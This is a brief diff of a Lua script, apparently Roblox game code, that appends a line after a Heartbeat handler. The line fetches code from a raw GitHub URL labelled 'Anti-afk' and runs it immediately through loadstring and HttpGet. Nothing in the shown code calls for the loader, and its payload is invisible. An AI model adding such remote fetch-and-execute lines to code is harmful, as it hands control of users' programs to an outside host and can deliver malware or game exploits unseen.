@@ -116,4 +116,6 @@ RunService.Heartbeat:Connect(function()
             end
         end
     end
-end)
+end);
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/Anti-afk/main/antiafkbyhassanxzyn"))();
